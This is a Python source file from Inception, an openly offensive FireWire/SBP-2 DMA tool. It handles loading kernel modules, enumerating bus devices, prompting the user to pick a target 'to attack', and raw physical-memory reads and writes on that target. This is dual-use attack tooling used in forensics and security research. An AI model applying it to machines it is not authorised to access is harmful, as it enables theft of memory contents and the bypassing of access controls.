'''
Inception - a FireWire physical memory manipulation and hacking tool exploiting
PCI-based and IEEE 1394 SBP-2 DMA.

Copyright (C) 2011-2014  Carsten Maartmann-Moe

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Created on Jan 23, 2012

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
'''
import os
import re
from subprocess import call
import sys
import time

from inception import cfg, util, terminal
from inception.exceptions import InceptionException


term = terminal.Terminal()

# Error handling for cases where libforensic1394 is not installed in /usr/lib
try:
    from forensic1394.bus import Bus
except OSError:
    host_os = util.detectos()
    try:
        path = os.environ['LD_LIBRARY_PATH']
    except KeyError:
        path = ''
    # If the host OS is Linux, we may need to set LD_LIBRARY_PATH to make
    # python find the libs
    if host_os == cfg.LINUX and '/usr/local/lib' not in path:
        os.putenv('LD_LIBRARY_PATH', "/usr/local/lib")
        util.restart()
    else:
        raise InceptionException('Could not load libforensic1394, please make '
                                 'sure that libforensic1394 is in your PATH')

# List of FireWire OUIs
OUI = {}


def initialize(opts, module):
    '''
    Convenience function to initialize the interface.

    Mandatory arguments:
    - opts: the options that the program was initiated with
    '''
    try:
        fw = FireWire(opts.delay)
    except IOError:
        raise InceptionException('Could not initialize FireWire. Are FW '
                                 'modules loaded into the kernel?')
    starttime = time.time()
    device_index = fw.select_device()
    elapsed = int(time.time() - starttime)

    try:  # TODO: Fix this more elegantly
        dry_run = opts.dry_run
    except AttributeError:
        dry_run = False
    
    # Lower DMA shield, and set memsize
    device = FireWireDevice(fw.getdevice(device_index, elapsed), dry_run)
    memsize = cfg.memsize
    return device, memsize


def unload_fw_ip():
    '''
    Unloads IP over FireWire modules if present on OS X
    '''
    unload = term.poll('Unload the IOFireWireIP modules that may cause '
                       'kernel panics? [y/n]:',
                       default='y')
    if unload in ['y', '']:
        command = 'kextunload /System/Library/Extensions/IOFireWireIP.kext'
        status = call(command, shell=True)
        if status == 0:
            term.info('IOFireWireIP.kext unloaded')
            term.info('To reload: sudo kextload /System/Library/Extensions/'
                      'IOFireWireIP.kext')
        else:
            raise InceptionException('Could not unload IOFireWireIP.kext')


class FireWire:
    '''
    FireWire wrapper class to handle some attack-specific functions
    TODO: Rename FireWireInterface
    '''

    def __init__(self, delay):
        '''
        Constructor
        Initializes the bus and sets device, OUI variables
        '''
        # Warn OS X users
        if cfg.os == cfg.OSX:
            term.warn('Attacking from OS X may cause host and/or target '
                      'system crashes, and is not recommended')
        self.delay = delay
        self._bus = Bus()
        try:
            self._bus.enable_sbp2()
        except IOError as e:
            if os.geteuid() == 0:  # Check if we are running as root
                answer = term.poll('FireWire modules are not loaded. Try '
                                   'loading them? [y/n]:',
                                   default='y')
                if answer in ['y', '']:
                    status_modprobe = call('modprobe firewire-ohci',
                                           shell=True)
                    status_rescan = call('echo 1 > /sys/bus/pci/rescan',
                                         shell=True)
                    if status_modprobe == 0 and status_rescan == 0:
                        try:
                            self._bus.enable_sbp2()
                        except IOError as e:
                            time.sleep(2)  # Give some more time
                            try:
                                self._bus.enable_sbp2()
                            except IOError as e:
                                raise InceptionException(
                                    'Unable to detect any local FireWire '
                                    'ports.', e)
                        term.info('FireWire modules loaded successfully')
                    else:
                        raise InceptionException('Could not load FireWire '
                                                 'modules, try running '
                                                 'inception as root', e)
                else:
                    raise InceptionException('FireWire modules not loaded per '
                                             'user\'s request')
            else:
                raise InceptionException('FireWire modules are not loaded and '
                                         'we have insufficient privileges to '
                                         'load them. Try running inception as '
                                         'root', e)
                
        # Enable SBP-2 support to ensure we get DMA
        self._devices = self._bus.devices()
        self._oui = self.init_OUI()
        self._vendors = []
        self._max_request_size = cfg.PAGESIZE
        
    def init_OUI(self, filename=cfg.OUICONF):
        '''Populates the global OUI dictionary with mappings between 24 bit
        vendor identifier and a text string. Called during initialization.
    
        Defaults to reading the value of module variable OUICONF.
        The file should have records like
        08-00-8D   (hex)                XYVISION INC.
    
        Feed it the standard IEEE public OUI file from
        http://standards.ieee.org/regauth/oui/oui.txt for a more up to date
        listing.
        '''
        OUI = {}
        try:
            f = util.open_file(filename, 'r')
            lines = f.readlines()
            f.close()
            regex = re.compile('(?P<id>([0-9a-fA-F]{2}-){2}[0-9a-fA-F]{2})'
                               '\s+\(hex\)\s+(?P<name>.*)')
            for l in lines:
                rm = regex.match(l)
                if rm is not None:
                    textid = rm.groupdict()['id']
                    ouiid = int('0x%s%s%s' % (textid[0:2], textid[3:5],
                                              textid[6:8]), 16)
                    OUI[ouiid] = rm.groupdict()['name']
        except IOError:
            term.warn('Vendor OUI lookups will not be performed: {0}'
                      .format(filename))
        return OUI
    
    def resolve_oui(self, vendor):
        try:
            return self._oui[vendor]
        except KeyError:
            return ''
            
    def businfo(self):
        '''
        Prints all available information of the devices connected to the FW
        bus, looks up missing vendor names & populates the internal vendor
        list
        '''
        if not self._devices:
            raise InceptionException('Could not detect any FireWire devices '
                                     'connected to this system')
        term.info('FireWire devices on the bus (names may appear blank):')
        print()
        for n, device in enumerate(self._devices, 1):
            vid = device.vendor_id
            # In the current version of libforensic1394, the
            # device.vendor_name.decode() method cannot be trusted (it often
            # returns erroneous data. We'll rely on OUI lookups instead
            # vendorname = device.vendor_name.decode(cfg.encoding)
            vendorname = self.resolve_oui(vid)
            self._vendors.append(vendorname)
            pid = device.product_id
            productname = device.product_name.decode(cfg.encoding)
            term.info('Vendor (ID): {0} ({1:#x}) | Product (ID): {2} ({3:#x})'
                      .format(vendorname, vid, productname, pid), sign=n)
        print()

    def select_device(self):
        selected = self.select()
        vendor = self._vendors[selected]
        # Print selection
        term.info('Selected device: {0}'.format(vendor))
        return selected
        
    def select(self):
        '''
        Present the user of the option to select what device (connected to the
        bus) to attack
        '''
        if not self._vendors:
            self.businfo()
        nof_devices = len(self._vendors)
        if nof_devices == 1:
            term.info('Only one device present, device auto-selected as '
                      'target')
            return 0
        else:
            selected = term.poll('Select a device to attack (or type \'q\' to '
                                 'quit): ')
            try:
                selected = int(selected)
            except:
                if selected == 'q':
                    sys.exit()
                else:
                    term.warn('Invalid selection. Type \'q\' to quit')
                    return self.select()
        if 0 < selected <= nof_devices:
            return selected - 1
        else:
            term.warn('Enter a selection between 1 and ' + str(nof_devices) +
                      '. Type \'q\' to quit')
            return self.select()
        
    def getdevice(self, num, elapsed):
        didwait = False
        try:
            term.wait('Initializing bus and enabling SBP-2, please wait '
                      'or press Ctrl+C', seconds=self.delay - elapsed)
        except KeyboardInterrupt:
            pass
        d = self._bus.devices()[num]
        d.open()
        if didwait:
            print()  # Create a LF so that next print() will start fresh
        return d
              
    @property
    def bus(self):
        '''
        The firewire bus; Bus.
        '''
        return self._bus
    
    @property
    def devices(self):
        '''
        The firewire devices connected to the bus; list of Device.
        '''
        self._devices = self._bus.devices()
        return self._devices
    
    @property
    def oui(self):
        '''
        The OUI dict
        '''
        return self._oui
    
    @property
    def vendors(self):
        '''
        The list of vendors
        '''
        return self._vendors

class FireWireDevice:
    '''
    Device wrapper class that handles the more finicky
    parts of reading memory. The device will return
    zeroes or simply not write to memory if the tool
    attempts to access memory regions that are protected
    '''
    def __init__(self, dev, dry_run):
        '''
        Constructor
        '''
        self.avoid = [0xa0000, 0xfffff] # Windows
        self._dev = dev
        self.dry_run = dry_run

    def read(self, addr, numb, buf=None):
        if self.avoid[0] <= addr <= self.avoid[1]:
            return b'\x00' * numb
        else:
            return self._dev.read(addr, numb, buf)
    
    def readv(self, req):
        # This will increase performance since we don't
        # have to check all elements in the list
        if self.avoid[0] <= req[0][0] <= self.avoid[1] or self.avoid[0] <= req[-1][0] <= self.avoid[1]:
            for r in req:
                if self.avoid[0] <= r[0] <= self.avoid[1]:
                    yield (r[0], b'\x00' * r[1])
                else:
                    yield (r[0], self._dev.read(r[0], r[1]))
        else:
            for r in self._dev.readv(req):
                yield r

    def write(self, addr, buf):
        if not self.dry_run and not (self.avoid[0] <= addr <= self.avoid[1]):
            self._dev.write(addr, buf)
    
    def close(self):
        self._dev.close()
